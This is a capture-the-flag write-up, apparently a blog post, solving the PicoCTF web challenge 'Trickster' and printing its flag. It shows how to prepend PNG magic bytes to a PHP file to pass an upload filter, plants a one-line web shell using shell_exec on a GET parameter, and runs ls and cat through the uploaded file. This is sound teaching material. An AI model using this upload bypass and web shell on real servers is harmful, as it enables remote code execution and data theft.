---
layout: post
title: "Trickster"
date: 2025-07-30
categories: [PicoCTF]
tags: [picoctf,webexploitation,Medium]
---
# 🃏 Trickster – PicoCTF

## 📘 Challenge Description

**I found a web app that can help process images: PNG images only!**

---
## 🛠️ Step-by-Step Solution
### 1. 🔍 Explore the Website

- Open the website and try uploading some files.
- Rename a `.php` file to something like `test.png.php` and try uploading it.
- It still fails — the site checks more than just the file extension.

---
### 2. 🧼 Check the Source Code

- Use `Ctrl + U` or right-click → "Inspect" → "Network/Elements".
- Nothing useful found directly.

---
### 3. 🤖 Look for Hidden Directories

Visit:`/robots.txt`
You’ll find:
`/information.txt`
`/uploads/`

---
### 4. 📄 Visit `/information.txt`
The file says:
Let's create a web app for PNG Images processing.

Requirements:
1. Allow users to upload PNG images
2. Check file extension (must be `.png`)
3. Validate magic bytes (hex: 50 4E 47)
4. Store the validated files securely

✅ This confirms the site is checking [**magic bytes**](https://docs.stairwell.com/docs/what-are-magic-bytes), not just the filename.

---
### 5. 🧪 Create a PHP File with PNG Header
Try uploading this PHP file named `vuln.png.php`:

```php
<?php echo phpversion(); ?>
```
But it fails: not a valid PNG image.
Now we’ll manually add the PNG magic bytes.

---
### 6. 🎩 Add PNG Magic Bytes Manually
To fool the server, prepend valid PNG bytes to the file.

```bash
echo -ne "\x89PNG\r\n\x1a\n" > vuln.png.php
echo "<?php echo phpversion(); ?>" >> vuln.png.php
```
Check it:
```bash
xxd vuln.png.php | head
```
Now the file starts with correct PNG magic bytes: **89 50 4E 47**

---
### 7. 📤 Upload the Modified File
Upload `vuln.png.php`.

Then visit:
`/uploads/vuln.png.php`

🎉 If you see the PHP version (like **8.3.x**), your code is executing!

---
### 8. 💻 Execute System Commands
Modify the file content to:
```php
<?php echo shell_exec($_GET[0]); ?>
```
Repeat the steps to add PNG header and upload the file again.

Visit:
```bash
/uploads/vuln.png.php?0=ls /var/www/html
```
You’ll see:
```bash
MQZWCYZWGI2WE.txt
index.php
instructions.txt
robots.txt
uploads
```
---
### 9.🏁 Read the Flag
To read the flag file:
`/uploads/vuln.png.php?0=cat /var/www/html/MQZWCYZWGI2WE.txt`

🎉 Flag displayed on screen!

**picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}**

---
## 🧠 Learning Outcomes from "Trickster"

1. Learned that websites check both file extension and content (magic bytes).
2. Discovered how to add PNG magic bytes to bypass upload filters.
3. Understood how to turn a PNG file into a PHP web shell.
4. Used `robots.txt` to find hidden directories and info.
5. Executed system commands using a PHP payload and `shell_exec()`.
6. Found how upload folders can be exploited if not secured properly.
7. Gained hands-on experience with file upload and remote code execution (RCE).

---










